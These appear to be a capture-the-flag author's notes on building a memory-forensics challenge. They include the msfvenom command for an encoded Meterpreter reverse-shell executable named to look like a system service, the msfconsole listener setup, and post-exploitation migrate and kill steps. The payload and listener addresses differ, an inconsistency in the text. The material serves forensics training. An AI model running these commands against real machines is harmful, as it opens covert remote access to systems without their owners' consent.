<p>The company workstation was a Windows 7 VMware VM (Windows product code is not needed for short usage). The Windows username is <code>Walter</code> and the password is <code>rickymartin</code>. The password is made easy to crack purely for fun, cracking it does not help in solving the challenge. There are two more easter eggs: a site with jokes in the IE browsing history and a rickroll YouTube URL in the clipboard.</p>
<p>The <code>Meterpreter</code> virus was created using <code>msfvenom</code>:
  <pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.62 lport=443 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o ~/Downloads/svcexplore.exe</pre>
Then, a callback listener was set up on the remote server using <code>msfconsole</code>:
  <pre>set LHOST 192.168.1.120<br></br>set LPORT 443<br></br>set PAYLOAD windows/meterpreter/reverse_tcp<br></br>use multi/handler<br></br>exploit</pre>
The exploit was copied to the workstation desktop and executed from there (with no AV installed, to makes things easier). Back on the remote server, the incoming connection is accepted and we migrate to a different process:
  <pre>ps<br></br>migrate 328<br></br>pkill svcexplore.exe</pre>
</p>
<p>The memory dump was created by suspending the VM and then running the following command in the VM directory:
  <pre>vmss2core -W challenge-3c77c33a.vmss challenge-3c77c33a.vmem</pre>
File names may differ, and <code>vmss2core</code> may still need to be downloaded from the <a href="https://flings.vmware.com/vmss2core">official website</a>.
</p>